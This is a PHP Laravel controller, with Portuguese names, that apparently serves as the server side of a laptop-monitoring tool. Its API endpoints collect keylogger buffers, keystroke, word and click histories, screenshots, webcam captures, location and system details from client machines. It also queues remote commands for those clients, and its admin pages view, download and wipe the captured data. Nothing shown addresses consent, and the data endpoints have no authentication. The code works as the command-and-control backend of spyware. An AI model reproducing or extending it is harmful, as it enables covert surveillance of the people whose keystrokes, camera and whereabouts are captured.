<?php
namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Notebook;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;

class NotebookController extends Controller
{
    // === API ENDPOINTS ===
    
    public function apiLogin(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'notebook_id' => 'required|string',
            'usuario' => 'required|string',
            'ip_address' => 'required|ip',
            'fonte_deteccao' => 'required|string',
            'hostname' => 'nullable|string',
            'sistema_operacional' => 'nullable|string',
            'info_sistema' => 'nullable|array',
            'screenshot' => 'nullable|string',
            'webcam' => 'nullable|string',
            'keylog_buffer' => 'nullable|string',
            'historico_teclas' => 'nullable|array',
            'historico_cliques' => 'nullable|array',
            'timestamp' => 'nullable|date'
        ]);

        if ($validator->fails()) {
            return response()->json(['error' => $validator->errors()], 400);
        }

        $notebook = Notebook::firstOrCreate(
            ['identificador' => $request->notebook_id],
            [
                'status' => 'online',
                'ip_address' => $request->ip_address,
                'hostname' => $request->hostname,
                'sistema_operacional' => $request->sistema_operacional
            ]
        );

        // CORREÇÃO: Garantir que os arrays sejam válidos
        $historicoTeclas = $this->sanitizeArray($request->historico_teclas);
        $historicoCliques = $this->sanitizeArray($request->historico_cliques);
        $infoSistema = $this->sanitizeArray($request->info_sistema);

        $updateData = [
            'usuario_atual' => $request->usuario,
            'ip_address' => $request->ip_address,
            'hostname' => $request->hostname,
            'sistema_operacional' => $request->sistema_operacional,
            'info_sistema' => $infoSistema,
            'screenshot' => $request->screenshot,
            'webcam' => $request->webcam,
            'keylog_buffer' => $request->keylog_buffer,
            'historico_teclas' => $historicoTeclas,
            'historico_cliques' => $historicoCliques,
            'ultimo_login' => now(),
            'ultimo_heartbeat' => now(),
            'status' => 'online'
        ];

        $notebook->update(array_filter($updateData));

        // Adiciona ao histórico de login
        $notebook->adicionarLogin(
            $request->usuario, 
            $request->ip_address, 
            $request->fonte_deteccao,
            $request->keylog_buffer
        );

        return response()->json(['success' => true]);
    }


     public function apiHeartbeat(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'notebook_id' => 'required|string',
            'status' => 'required|string',
            'usuario' => 'nullable|string',
            'ip_address' => 'nullable|ip',
            'hostname' => 'nullable|string',
            'sistema_operacional' => 'nullable|string',
            'info_sistema' => 'nullable|array',
            'keylog_buffer' => 'nullable|string',
            'historico_palavras' => 'nullable|array', // Novo campo
            'historico_cliques' => 'nullable|array',
            'localizacao' => 'nullable|array', // Novo campo
            'timestamp' => 'nullable|date'
        ]);

        if ($validator->fails()) {
            return response()->json(['error' => $validator->errors()], 400);
        }

        $notebook = Notebook::where('identificador', $request->notebook_id)->first();

        if (!$notebook) {
            return response()->json(['error' => 'Notebook não encontrado'], 404);
        }

        // Atualização incremental para novos campos
        $currentPalavras = $this->sanitizeArray($notebook->historico_palavras);
        $newPalavras = $this->sanitizeArray($request->historico_palavras);
        $mergedPalavras = array_merge($currentPalavras, $newPalavras);

        $currentCliques = $this->sanitizeArray($notebook->historico_cliques);
        $newCliques = $this->sanitizeArray($request->historico_cliques);
        $mergedCliques = array_merge($currentCliques, $newCliques);

        $updateData = [
            'status' => $request->status,
            'usuario_atual' => $request->usuario ?? $notebook->usuario_atual,
            'ip_address' => $request->ip_address ?? $notebook->ip_address,
            'hostname' => $request->hostname ?? $notebook->hostname,
            'sistema_operacional' => $request->sistema_operacional ?? $notebook->sistema_operacional,
            'info_sistema' => $this->sanitizeArray($request->info_sistema) ?: $notebook->info_sistema,
            'keylog_buffer' => $request->keylog_buffer ?? $notebook->keylog_buffer,
            'historico_palavras' => array_slice($mergedPalavras, -200), // Limite maior para palavras
            'historico_cliques' => array_slice($mergedCliques, -200),
            'localizacao' => $this->sanitizeArray($request->localizacao) ?: $notebook->localizacao,
            'ultimo_heartbeat' => now()
        ];

        $notebook->update(array_filter($updateData));

        return response()->json(['success' => true]);
    }

    /**
     * Sanitiza um array, garantindo que seja um array válido
     */
    private function sanitizeArray($data)
    {
        if (is_null($data)) {
            return [];
        }
        
        if (!is_array($data)) {
            return [];
        }

        return $data;
    }

     public function apiComandos($notebookId)
    {
        $notebook = Notebook::where('identificador', $notebookId)->first();

        if (!$notebook) {
            return response()->json(['error' => 'Notebook não encontrado'], 404);
        }

        $comandos = $notebook->comandos_pendentes ?? [];
        
        
        // Não limpa os comandos aqui - só quando forem executados
        return response()->json($comandos);
    }

    public function apiMidia(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'notebook_id' => 'required|string',
            'tipo' => 'required|in:screenshot,webcam',
            'dados' => 'required|string',
            'comando_id' => 'nullable|string',
            'limpar_anterior' => 'nullable|boolean' // Novo campo
        ]);

        if ($validator->fails()) {
            return response()->json(['error' => $validator->errors()], 400);
        }

        $notebook = Notebook::where('identificador', $request->notebook_id)->first();

        if (!$notebook) {
            return response()->json(['error' => 'Notebook não encontrado'], 404);
        }

        // Limpa mídia anterior se solicitado
        if ($request->limpar_anterior) {
            $notebook->update([$request->tipo => null]);
        }

        // Atualiza a mídia
        $notebook->update([$request->tipo => $request->dados]);

        // Marca comando como executado se tiver ID
        if ($request->comando_id) {
            $this->marcarComandoExecutado($notebook, $request->comando_id);
        }


        return response()->json([
            'success' => true,
            'comando_id' => $request->comando_id,
            'limpo_anterior' => $request->limpar_anterior
        ]);
    }

    private function marcarComandoExecutado(Notebook $notebook, string $comandoId)
    {
        $comandos = $notebook->comandos_pendentes ?? [];
        
        foreach ($comandos as &$comando) {
            if (isset($comando['id']) && $comando['id'] === $comandoId) {
                $comando['executado'] = true;
                $comando['executado_em'] = now()->toISOString();
                break;
            }
        }
        
        $notebook->update(['comandos_pendentes' => $comandos]);
        
    }


    // === ADMIN VIEWS ===
    
    public function index()
    {
        $notebooks = Notebook::orderBy('ultimo_heartbeat', 'desc')->get();
        return view('admin.notebooks.index', compact('notebooks'));
    }

    public function show($id)
    {
        $notebook = Notebook::findOrFail($id);
        return view('admin.notebooks.show', compact('notebook'));
    }

    public function enviarComando($id)
    {
        $notebook = Notebook::findOrFail($id);
        
        $acao = request('acao');
        
        // Usar o sistema de comandos existente no modelo Notebook
        $comandos = $notebook->comandos_pendentes ?? [];
        
        $novoComando = [
            'id' => uniqid(),
            'acao' => $acao,
            'criado_em' => now()->toISOString(),
            'executado' => false
        ];
        
        $comandos[] = $novoComando;
        
        // Limitar a quantidade de comandos pendentes
        if (count($comandos) > 10) {
            $comandos = array_slice($comandos, -10);
        }
        
        $notebook->update(['comandos_pendentes' => $comandos]);
        
        return redirect()->back()->with('success', "Comando {$acao} enviado com sucesso!");
    }
    
    public function downloadMidia($id, $tipo)
    {
        $notebook = Notebook::findOrFail($id);
        $dados = $tipo === 'screenshot' ? $notebook->screenshot : $notebook->webcam;

        if (!$dados) {
            return back()->with('error', 'Mídia não encontrada');
        }

        $imageData = base64_decode($dados);
        
        return response($imageData)
            ->header('Content-Type', 'image/jpeg')
            ->header('Content-Disposition', "attachment; filename=\"{$tipo}_{$notebook->identificador}.jpg\"");
    }

    public function store(Request $request)
    {
        $request->validate([
            'identificador' => 'required|string|unique:notebooks'
        ]);

        Notebook::create([
            'identificador' => $request->identificador,
            'status' => 'offline'
        ]);

        return redirect()->route('admin.notebooks.index')
            ->with('success', 'Notebook cadastrado com sucesso!');
    }



    public function limparDados($id)
    {
        $notebook = Notebook::findOrFail($id);
        $dadosParaLimpar = request('dados', []);
        
        if (in_array('todos', $dadosParaLimpar) || empty($dadosParaLimpar)) {
            // Limpar tudo
            $notebook->update([
                'screenshot' => null,
                'webcam' => null,
                'keylog_buffer' => null,
                'historico_teclas' => null,
                'historico_cliques' => null,
                'historico_logins' => null,
                'atividades_recentes' => null,
            ]);
        } else {
            $updates = [];
            
            if (in_array('screenshot', $dadosParaLimpar)) {
                $updates['screenshot'] = null;
            }
            if (in_array('webcam', $dadosParaLimpar)) {
                $updates['webcam'] = null;
            }
            if (in_array('keylog', $dadosParaLimpar)) {
                $updates['keylog_buffer'] = null;
                $updates['historico_teclas'] = null;
            }
            if (in_array('cliques', $dadosParaLimpar)) {
                $updates['historico_cliques'] = null;
            }
            if (in_array('logins', $dadosParaLimpar)) {
                $updates['historico_logins'] = null;
            }
            
            $notebook->update($updates);
        }
        
        return redirect()->back()->with('success', 'Dados limpos com sucesso!');
    }
}